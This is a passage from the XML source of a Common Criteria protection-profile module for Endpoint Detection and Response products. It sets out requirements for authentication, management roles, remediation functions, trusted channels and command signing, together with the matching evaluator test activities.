                      <selectable>"^"</selectable>
                      <selectable>"&#38;"</selectable>
                      <selectable> "*"</selectable>
                      <selectable>"("</selectable>
                      <selectable>")"</selectable>
                      <selectable><assignable>other characters</assignable></selectable>
                    </selectables>
                  </h:li>
                  <h:li>Password length up to <assignable>an integer greater than or equal to
                      64</assignable> characters shall be supported. </h:li>
                </h:ol>
              </title>
              <note role="application"> The ST author selects the character set:
                either the upper and lower case Basic Latin letters or another assigned character
                set containing at least 52 characters. The assigned character set must be well
                defined: either according to an international encoding standard (such as Unicode) or
                defined in the assignment by the ST author. The ST
                 author also selects the special characters that are supported by TOE
                 they may optionally list additional special characters supported
                using the assignment. </note>
              <aactivity>
                <TSS>The evaluator shall verify the TSS includes all the supported characters, rules, and limitations used by the EDR and that they meet the reuqirements of the SFR.</TSS>
                <Guidance>The evaluator shall review the operational guidance to ensure that it
                  contains documentation on default password policy.</Guidance>
                <Tests>The evaluator shall perform the following tests:
                  <testlist>
                    <test>The evaluator verify that passwords up to 64 characters are supported.</test>
                    <test> The evaluator shall verify that password composition rules present in operational guidance
                      are enforced. While the evaluator is not required (nor is it feasible) to test all possible
                      composition rules, the evaluator shall ensure that all characters are supported, and rule characteristics
                      listed in the requirement are enforced.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>
          
          <ext-comp-def fam-id="FIA_AUT_EXT" title="Dashboard Authentication Mechanisms">
            <mod-def>Components in this family define requirements for authentication behavior that is unique to an EDR TOE.</mod-def>
          </ext-comp-def>
          
          <f-component id="fia_aut_ext.1" name="Dashboard Authentication Mechanisms">
            <consistency-rationale> This SFR defines authentication mechanisms for the EDR. It does
              not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            
            <comp-lev> identifies the only authentication factors that may be used for authentication to a management interface of an EDR.</comp-lev>
            <management>No specific management functions are identified.</management>
            <audit>There are no auditable events foreseen.</audit>
            <dependencies>No dependencies.</dependencies>
            
            <f-element>
              <title> The EDR shall 
                <selectables>
                  <selectable>leverage the platform for authentication</selectable>
                  <selectable>provide the following authentication
                    mechanisms, authentication based on username and password and <selectables
                      linebreak="yes">
                      <selectable>authentication with external Smartcard and PIN</selectable>
                      <selectable>invocation of platform-provided functionality</selectable>
                      <selectable>no other factors</selectable>
                    </selectables></selectable>
                </selectables> to support logins to any management dashboard or API. </title>
              <note role="application">The selection specifies if Smartcards are also supported, one selection must be made.</note>
              <aactivity>
                <TSS>The evaluation shall examine the TSS to ensure that it describes how user authentication is performed.  
                The evaluator shall verify that the authorization methods listed in the TSS are specified and included in the requirements in the ST.</TSS>
                <Guidance>The evaluator shall review the operational guidance to ensure that it
                  contains documentation on configuring any supported authentication mechanisms and any support for 
                  multifactor authentication.</Guidance>
                <Tests>
                  <testlist>
                    <test>Conditional: If "provide the following authentication mechanisms" is selected, 
                      the evaluator shall create an account with a username and password, verifying
                      that login authentication is case-sensitive. If additional factors are provided, each
                      factor shall be tested for login access with strictly unanimous authentication for those
                      enabled. The evaluator shall verify that login access is granted for correct credentials
                      and denied in cases of incorrect credentials across available factors.</test>
                    <test>
                      Conditional: If "leverage the platform" is selected, the evaluator shall create an account following the platform rules. 
                      If additional factors are provided, each
                      factor shall be tested for login access with strictly unanimous authentication for those
                      enabled. The evaluator shall verify that login access is granted for correct credentials
                      and denied in cases of incorrect credentials across available factors.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

        </subsection>

        <subsection title="Security Management (FMT)" id="fmt">
          
  
          <f-component id="fmt_smf.1" iteration="HOST" name="Specification of Management Functions (EDR Management of Host Agent)">
            <consistency-rationale>This SFR defines a specific set of management functions for an
              Host Agent by an EDR. It does not impact the <cite linkend="bibAppPP"/> functionality.</consistency-rationale>
            <f-element>
              <title>The EDR shall be capable of performing the following functions that control
                behavior of the Host Agent:<h:br/>
                <management-function-set default="O">
                  <manager id="a">Administrator</manager>
                  <manager id="s">SOC Analyst</manager>
                  <manager id="u">Read-Only User</manager>
                  <management-function>
                    <text>Configure the time frame for sending Host Agent data to the EDR
                        <assignable>list of configurable time frames</assignable>
                    </text>
                    <M ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text>Assign a label or tag to categorize or group individual endpoint systems </text>
                    <M ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                </management-function-set>
              </title>
              <note role="application">This requirement captures all the configuration
                functionality the EDR provides the administrator to configure the
                EDR Host Agents. <h:br/><h:br/>
              Chart legend: X = Mandatory, O = Optional, - = N/A</note>
              <aactivity>
                <TSS>The evaluator shall verify the ST contains a list of roles and what functions they can perform.  
                  The evaluator shall verify the list matches the chart in the requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to verify that the EDR has
                documented capabilities to perform the management functions.</Guidance>
                <Tests>The evaluator shall perform the below tests:
                 <testlist>
                   <test>The evaluator shall modify the time frame for sending Host Agent data to the EDR
                   and verify that an affected Host Agent is sending data at the intended interval.</test>
                   <test>The evaluator shall tag or categorize a group of individual endpoint systems and
                   verify that the tag or categorization persists within the EDR management dashboard for
                   other users.</test>
                   <test>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</test>
                 </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>
          
          
          <f-component name="Specification of Management Functions (EDR Management of EDR)" id="fmt_smf.1" iteration="ENDPOINT">
            <consistency-rationale>This SFR defines a specific set of management functions for an
              EDR by an EDR. It does not impact the <cite linkend="bibAppPP"/> functionality.</consistency-rationale>
          <f-element>
              <title> The EDR shall be capable of performing the following
                management functions: <h:br/>
                <management-function-set default="O">
                  <manager id="a">Administrator</manager>
                  <manager id="s">SOC Analyst</manager>
                  <manager id="u">Read-Only User</manager>
                  <management-function>
                    <text>Configure the amount of time to retain data collected by the EDR
                        <assignable>time frame to retain data</assignable>
                    </text>
                    <M ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Obtain or display the connectivity status of a Host Agent </text>
                    <M ref="a"/><O ref="s"/><O ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Define a configurable
                      blacklist of <selectables>
                        <selectable>filenames</selectable>
                        <selectable>folders</selectable>
                        <selectable>file hashes</selectable>
                        <selectable><assignable>other factors</assignable></selectable>
                      </selectables>
                    </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Configure visual suppression of incident alerts based on a configurable
                      blacklist of <selectables>
                        <selectable>filenames</selectable>
                        <selectable>folders</selectable>
                        <selectable>file hashes</selectable>
                        <selectable><assignable>other factors</assignable></selectable>
                      </selectables>
                    </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                </management-function-set>
              </title>
              <note role="application"> This requirement captures all the configuration
                functionality the TSF provides the administrator to configure the
                EDR. 
              
                <h:br/><h:br/>
                Chart legend: X = Mandatory, O = Optional, - = N/A</note>
              <aactivity>
                <TSS>The evaluator shall verify the ST contains a list of roles and what functions they can perform.  
                  The evaluator shall verify the list matches the chart in the requirement.</TSS>
                <Guidance>The evaluator shall review the operational guidance to verify that the EDR has
                  documented capabilities to perform the management functions.</Guidance>
                <Tests>The evaluator shall perform the below tests with each role, 
                  verifying each role is denied or can complete the action below as specified by the chart in the SFR:
                  <testlist>
                    <test>The evaluator shall configure the amount of time to retain collected EDR data
                    to a time frame in which existing data will be made unavailable and verify that the
                    data is no longer accessible through the EDR management dashboard.</test>
                    <test>The evaluator shall logically or physically inhibit the network communications
                    between a managed endpoint system and the EDR server and verify that the inhibited or halted
                    connectivity status of the Host Agent is recognized on the EDR management dashboard.</test>
                    <test>The evaluator shall use a file that triggers an incident alert to test the suppression
                    of such alerts for that specific file. Upon confirming the creation of incident alerts on access
                    to the file, the evaluator shall configure suppression of the alert for each available
                    suppression blacklist file or metadata characteristic and verify that incident alerts are
                    categorized as suppressed, hidden, unavailable, or never created.</test>
                    <test>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>
          
          
          <f-component id="fmt_smr.1" name="Security Management Roles">
            <consistency-rationale> This SFR defines a specific set of management roles for an EDR.
              It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>        
            
            <f-element>
              <title>The EDR shall maintain the roles of administrator, SOC analyst, read-only
                user.</title>
              <note role="application">The EDR will be configured, maintained, and
                used by different user roles. At a minimum, one administrative role shall be
                supported, one SOC analyst who can issue remediation commands to host agents, and
                one read-only user who can only view data. <h:br/> The user accounts need not be
                named literally, but they must have the implication of such roles.</note>
              <aactivity>
                
                <TSS> The evaluator shall examine the TSS to verify that it
                  describes the roles and the powers granted to and limitations of the role. </TSS>
                <Guidance> The evaluator shall review the operational guidance to ensure that it
                  contains instructions for administering the EDR, which user
                  roles are supported, and which permissions each default role has.</Guidance>
                <Tests>
                  <testlist>
                    <test>The evaluator shall verify that the roles of administrator, SOC analyst, and
                      read-only user are available by default, creating individual accounts with each
                      role assigned.</test>
                    <test>The evaluator shall verify that non-administrator roles are not able to modify
                      the roles of their own account or those of others.</test>
                    <test>In the course of performing the testing activities for the evaluation,
                      the evaluator shall use all supported interfaces, although it is not
                      necessary to repeat each test involving an administrative action with each
                      interface. The evaluator shall ensure, however, that each supported method
                      of administering the EDR that conforms to the requirements
                      of this PP be tested; for instance, if the EDR can be administered through a local hardware interface or
                      TLS/HTTPS then both methods of administration must be exercised during the
                      evaluation teams test activities.</test>
                    <test>The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>
          
          
          <ext-comp-def fam-id="FMT_SRF_EXT" title="Specification of Remediation Functions">
            <mod-def>Components in this family define requirements for remediation functions that an EDR can perform to affect the behavior of an endpoint system.</mod-def>
          </ext-comp-def>

          <f-component id="fmt_srf_ext.1" name="Specification of Remediation Functions">
            <consistency-rationale> This SFR defines a specific set of remediation functions for an
              EDR. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            
            <comp-lev> lists the supported remediation functions and identifies the management roles that may perform these functions.</comp-lev>
            <management>No specific management functions are identified.</management>
            <audit>There are no auditable events foreseen.</audit>
            <dependencies>FMT_SMR.1 Security Management Roles</dependencies>
            
            <f-element>
              <title> The EDR shall be capable of performing the following
                remediation functions: <h:br/>
                <management-function-set default="O">
                  <manager id="a">Administrator</manager>
                  <manager id="s">SOC Analyst</manager>
                  <manager id="u">User</manager>
                  
                  <management-function>
                    <text> Quarantine an endpoint by 
                      <selectables>
                        <selectable>logically quarantining the endpoint from the network unless whitelisted</selectable>
                        <selectable>quarantining the malicious file on the endpoint </selectable>
                    </selectables> </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Terminate a running process on an endpoint </text>
                    <O ref="a"/><M ref="s"/><_ ref="u"/>
                  </management-function>
                  <management-function>
                    <text> Retrieve potentially unauthorized or affected files from an endpoint </text>
                    <O ref="a"/><O ref="s"/><_ ref="u"/>
                  </management-function>
                </management-function-set>
              </title>
              <note role="application"> This requirement captures all the remediation functionality
                the EDR provides the SOC Analyst and optionally the Administrator.
                <h:br/><h:br/>Logically quarentine from the network refers to restricting communications from the endpoint to the rest of the network, 
                it may include a restricted whitelist.
               
                <h:br/><h:br/>
                Chart legend: X = Mandatory, O = Optional, - = N/A</note>
              <aactivity>
                <TSS>The evaluator shall check to ensure that the TSS describes what roles can perform what 
                  remediation actions and how each remediation action is performed.</TSS>
                <Guidance>The evaluator shall review the operational guidance to verify that the EDR has
                  documented capabilities to perform the management functions.</Guidance>
                <Tests>The evaluator shall perform the below tests:
                  <testlist>
                    <test>Conditional: If logically quarantining the endpoint from the network is selected 
                      the evaluator shall logically quarantine a managed endpoint system from the
                    network and verify that the system is unable to access network addresses or resources
                    outside of a whitelist.</test>
                    <test>Conditional: If quarantining the malicious file on the endpoint is selected 
                      the evaluator shall verify the functionality to quarantine potentially unauthorized files on the endpoint.</test>
                    <test>The evaluator shall run an executable on a managed endpoint system and terminate
                    its process from the EDR management dashboard before verifying that the process is no
                    longer running on the system.</test>
                    <test>The evaluator shall place a file known to trigger an incident alert on the file system then retrieve the 
                      contents of the file from the EDR management dashboard.</test>
                  </testlist>
                </Tests>
              </aactivity>
            </f-element>
          </f-component>

        </subsection>

        <subsection title="Trusted Path/Channels (FTP)" id="ftp">

          <!--  we may need to refine DIT_EXT.1.1
        <f-component id="ftp_dit_ext.1(2)" name="Protection of Data in Transit">
          <consistency-rationale>
            The Base-PP defines FTP_DIT_EXT.1 to define the secure
            protocols used for trusted path/channel communications. This PP-Module
            iterates the SFR to specify a subset of those selections for communication.
          </consistency-rationale>

          <f-element>
            <title><h:b>Refinement:</h:b> The application shall
              <selectables linebreak="yes">

                <selectable>encrypt all transmitted
                  <selectables>
                    <selectable>sensitive data</selectable>
                    <selectable>data</selectable>
                  </selectables> with
                  <selectables>
                    <selectable id="sel_all_https"><h:abbr title="Hypertext Transfer Protocol Secure">HTTPS</h:abbr> in accordance with FCS_HTTPS_EXT.1</selectable>
                    <selectable id="sel_all_tlsc"><h:abbr title="Transport Layer Security">TLS</h:abbr> as defined in the <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=439&amp;id=439"><h:i>TLS Package</h:i></h:a></selectable>
                    <selectable id="sel_all_dtls"><h:abbr title="Datagram Transport Layer Security">DTLS</h:abbr> as defined in the <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=439&amp;id=439"><h:i>TLS Package</h:i></h:a></selectable>
                    <selectable>SSH as conforming to the Extended Package for <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=389&amp;id=389"><h:i>Secure Shell</h:i></h:a></selectable>
                  </selectables>
                </selectable>

                <selectable>invoke platform-provided functionality to encrypt all transmitted sensitive data with
                  <selectables>
                    <selectable><h:abbr title="Hypertext Transfer Protocol Secure">HTTPS</h:abbr></selectable>
                    <selectable><h:abbr title="Transport Layer Security">TLS</h:abbr></selectable>
                    <selectable><h:abbr title="Datagram Transport Layer Security">DTLS</h:abbr></selectable>
                    <selectable>SSH</selectable>
                  </selectables>
                </selectable>

                <selectable>invoke platform-provided functionality to encrypt all transmitted data with
                  <selectables>
                    <selectable><h:abbr title="Hypertext Transfer Protocol Secure">HTTPS</h:abbr></selectable>
                    <selectable><h:abbr title="Transport Layer Security">TLS</h:abbr></selectable>
                    <selectable><h:abbr title="Datagram Transport Layer Security">DTLS</h:abbr></selectable>
                    <selectable>SSH</selectable>
                  </selectables>
                </selectable>

              </selectables>
              between itself and another trusted IT product.
            </title>
            <note role="application">
              Encryption is not required for applications transmitting data that is not sensitive.
              <h:br/>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>TLS</h:i> is selected, then evaluation of elements from either <linkref linkend="FCS_TLSC_EXT.1"/> or <linkref linkend="FCS_TLSS_EXT.1"/> is required.</h:p>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>HTTPS</h:i> is selected, <linkref linkend="FCS_HTTPS_EXT.1"/> is required.</h:p>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>DTLS</h:i> is selected, <linkref linkend="FCS_DTLS_EXT.1"/> is required.</h:p>
              <h:p> If <h:i>encrypt all transmitted</h:i> is selected and <h:i>SSH</h:i> is selected, the TSF shall be validated against the <h:i>Extended Package for <h:a href="https://www.niap-ccevs.org/Profile/Info.cfm?PPID=389&amp;id=389">Secure Shell</h:a></h:i>.</h:p>
              <h:p>
                If <h:i>encrypt all transmitted</h:i> is selected the corresponding FCS_COP.1 requirements will be included.
              </h:p>
            </note>
            <aactivity>

            </aactivity>
          </f-element>
        </f-component>
        -->
          
          
          <f-component id="ftp_itc.1" name="Trusted Channel (Host Agent)">
            <consistency-rationale> This SFR defines a specific set of functions for logically distinct secure
              communication with a Host Agent. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
            <f-element>
              <title>The <selectables>
                <selectable>EDR</selectable>
                <selectable>EDR platform</selectable>
              </selectables> shall use <selectables>
                <selectable id="ITC_TLS_2">TLS as defined in the TLS Package</selectable>
                <selectable id="ITC_HTTPS_2">HTTPS as defined in the Base-PP</selectable>
              </selectables> to provide a trusted communication channel between itself and another
                trusted IT product that is logically distinct from other communication channels,
                provides assured identification of its endpoints, protects channel data from
                disclosure, and detects modification of the channel data. </title>
              <note role="application"> The intent of the above requirement is to use the
                cryptographic protocols identified in the requirement to establish and maintain a
                trusted channel between the EDR and the Host Agent. Only TLS or
                HTTPS can be used in this trusted channel. <h:br/><h:br/> This requirement is to
                ensure that the transmission of any logs, process lists, system information, etc,
                when commanded, or at configurable intervals, is properly protected. This trusted
                channel also protects any commands and policies sent by the EDR to
                the Host Agent. Either the Host Agent or the EDR System is able to
                initiate the connection. <h:br/><h:br/> This trusted channel protects both the
                connection between an enrolled Host Agent and the EDR and the
                connection between an unenrolled Host Agent and the EDR during the
                enrollment operation. Different protocols can be used for these two connections, and
                the description in the TSS should make this difference clear.
                <h:br/><h:br/> The trusted channel uses TLS, or HTTPS as the protocol that preserves
                the confidentiality and integrity of EDR communications. The ST author chooses the mechanism 
                or mechanisms supported by the EDR, and then ensures the correct requirements are included the 
                ST if not already present. Protocol, RBG, Certificate validation,
                algorithm, and similar services may be met with platform provided services. </note>
            </f-element>
            <f-element>
              <title>The <selectables>
                <selectable>EDR</selectable>
                <selectable>EDR platform</selectable>
              </selectables> shall provide functionality to permit the EDR and Host Agent to initiate
                communication via the trusted channel. </title>
            </f-element>
            <f-element>
              <title>The <selectables>
                <selectable>EDR</selectable>
                <selectable>EDR platform</selectable>
              </selectables> shall provide functionality to initiate communication via the trusted channel for <assignable>list of service for which the EDR is able to initiate communications</assignable></title>
              <aactivity>
                
                <TSS> The evaluator shall examine the TSS to verify how Agent-Server communications are protected is described and conforms to the SFR. 
                  The evaluator shall also confirm that all protocols
                  listed in the TSS are consistent with those specified in the requirement, and are
                  included in the requirements in the ST. </TSS>
                <Guidance> The evaluator shall confirm that the operational guidance contains
                  instructions for configuring the communication channel between the Host Agent and
                  the EDR for each supported method. 
                </Guidance>
                <Tests>
                  <testlist>
                    <test> The evaluators shall ensure that communications using each specified
                        (in the operational guidance) Agent-Server communication method is tested
                        during the course of the evaluation, setting up the connections as described
                        in the operational guidance and ensuring that communication is successful. </test>
                    <test> The evaluator shall ensure, for each method of Agent-Server
                        communication, the channel data is not sent in plaintext. </test>
                    </testlist>
                  </Tests>
              </aactivity>
            </f-element>
          </f-component>

          <f-component id="ftp_trp.1" name="Trusted Path (for Remote Administration)">
            <consistency-rationale>This SFR defines a specific set of functions for secure remote
              administration of the EDR. It does not impact <cite linkend="bibAppPP"/> functionality.</consistency-rationale>
            <f-element>
              <title><h:b>Refinement:</h:b> The <selectables>
                  <selectable>EDR</selectable>
                  <selectable>EDR platform</selectable>
                </selectables> shall use <selectables>
                  <selectable id="FTP_TLS_2">TLS as defined in the TLS Package</selectable>
                  <selectable id="FTP_HTTPS_2">HTTPS as defined in the Base-PP</selectable>
                </selectables> to provide a trusted communication path between itself and remote
                administrators that is logically distinct from other communication paths,
                provides assured identification of its endpoints, and protects the communicated
                data from modification and disclosure.</title>
            </f-element>
            <f-element>
              <title><h:b>Refinement:</h:b> The <selectables>
                  <selectable>EDR</selectable>
                  <selectable>EDR platform</selectable>
                </selectables> shall permit remote administrators to initiate communication via the
                trusted path.</title>
            </f-element>
            <f-element>
              <title><h:b>Refinement:</h:b> The <selectables>
                  <selectable>EDR</selectable>
                  <selectable>EDR platform</selectable>
                </selectables> shall require the use of the trusted path for all remote
                administration actions.</title>
              <note role="application">This requirement ensures that authorized remote
                administrators initiate all communication with the EDR via a
                trusted path, and that all communications with the EDR by remote
                administrators is performed over this path. The data passed in this trusted
                communication channel are encrypted as defined the protocol chosen in the first
                selection. The ST author chooses the mechanism or mechanisms
                supported by the EDR. </note>
              <aactivity>

                <TSS> The evaluator shall examine the TSS to verify how remote administration communications are protected is described and conforms to the SFR. 
                  The evaluator shall examine the TSS to determine that the
                  methods of remote TOE administration are indicated, along with
                  how those communications are protected. The evaluator shall also confirm that all
                  protocols listed in the TSS in support of TOE
                  administration are consistent with those specified in the requirement, and are
                  included in the requirements in the ST. </TSS>
                <Guidance> The evaluator shall confirm that the operational guidance contains
                  instructions for establishing the remote administrative sessions for each
                  supported method. </Guidance>
                <Tests>
                    <testlist>
                      <test> The evaluators shall ensure that communications using each specified
                        (in the operational guidance) remote administration method is tested during
                        the course of the evaluation, setting up the connections as described in the
                        operational guidance and ensuring that communication is successful. </test>
                      <test> For each method of remote administration supported, the evaluator shall
                        follow the operational guidance to ensure that there is no available
                        interface that can be used by a remote user to establish remote
                        administrative sessions without invoking the trusted path. </test>
                      <test> The evaluator shall ensure, for each method of remote administration,
                        the channel data is not sent in plaintext. </test>
                    </testlist>
                  </Tests>
              </aactivity>
            </f-element>
          </f-component>


        </subsection>
    </man-sfrs>

    <opt-sfrs/>

    <sel-sfrs> </sel-sfrs>

    <obj-sfrs>
      <subsection title="Security Management (FMT)" id="fmt">
        
        <ext-comp-def fam-id="FMT_TRM_EXT" title="Trusted Remediation Functions">
          <mod-def>Components in this family define how the TOE can assert the authenticity of the remediation actions it requests from Host Agents.</mod-def>
        </ext-comp-def>

        <f-component id="fmt_trm_ext.1" name="Trusted Remediation Functions">
          <consistency-rationale>This SFR defines protections for the integrity of commands sent to
            the Host Agent. It does not impact the <cite linkend="bibAppPP"/> functionality. </consistency-rationale>
          
          
          <comp-lev> requires all management activities bound for a Host Agent to be digitally signed.</comp-lev>
          <management>No specific management functions are identified.</management>
          <audit>There are no auditable events foreseen.</audit>
          <dependencies>No dependencies.</dependencies>
          <!-- SME: note that FCS_COP.1 could also be considered for a dependency here but was not included since an EDR TOE may rely on the platform to provide the digital signature service. -->
          
          <f-element>
            <title>The EDR shall digitally sign commands and policies sent to the
              Host Agent in accordance with FCS_COP.1.1(3). </title>
            <note role="application"> The intent of this requirement is to cryptographically tie any policy updates or
            commends sent to the Host Agent as being from the EDR. This is not to 
            protect the policies in transit as they are already protected by FTP_DIT_EXT.1.1. 
		    The digital signature used to sign policies or commands
            must be selected in FCS_COP.1.1(3). The use of this requirement makes FCS_COP.1.1(3)
            from the Base-PP a mandatory requirement.</note>
            <aactivity>
              <TSS>The evaluator shall check to ensure that the TSS describes how all commands and policies are signed.</TSS>
              <Guidance>The evaluator shall review the operational guidance and ensure that the
                EDR any configuration information for policy signing is included.
              </Guidance>
              <Tests>The evaluator shall select any one remediation function documented in the
                administrative guide (e.g., terminate process), and execute that command
                while capturing traffic. The evaluator shall review captured network traffic and
                verify that a digital signature was sent along with the coinciding command or policy update.
                The EDR may need to be configured in a manner to disable transport
                encryption for this test or the network capture tool may need to be
                configured with the private key such that decrypted traffic can be made
                available to the evaluator.
              </Tests>
            </aactivity>
          </f-element>
        </f-component>
      </subsection>
    </obj-sfrs>

  </chapter>

  <bibliography>
    <cc-entry/>
    <entry id="bibAppPP">
      <tag>AppPP</tag>
      <description>
        <h:a href="https://www.niap-ccevs.org/pp/PP_APP_v1.3/">Protection Profile for Application
          Software</h:a>
      </description>
    </entry>
    <entry id="bibHAGT">
      <tag>Host Agent</tag>
      <description>
        <h:a href="https://commoncriteria.github.io/pp/esm-hostagent/esm-hostagent-release.html"
          >Module for ESM Host Agent, Version 1.0, July 2019</h:a>
      </description>
    </entry>
    
  </bibliography>
  <acronyms/>
</Module>
